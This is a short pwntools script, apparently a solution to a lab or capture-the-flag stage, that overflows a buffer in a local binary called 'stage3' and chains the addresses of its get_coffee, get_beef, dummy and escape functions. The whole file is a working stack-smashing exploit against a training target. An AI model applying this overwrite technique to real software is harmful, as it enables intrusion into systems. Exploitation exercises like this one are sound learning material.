import sys
from pwn import process, context, p64, ELF
import time
import re


target = './stage3'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
dummy = context.binary.symbols['dummy']
escape = context.binary.symbols['escape']
coffee = context.binary.symbols['get_coffee']
beef = context.binary.symbols['get_beef']

input = b'a'*56
input += p64(coffee)
input += p64(beef)
input += p64(dummy)
input += p64(escape)

####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))







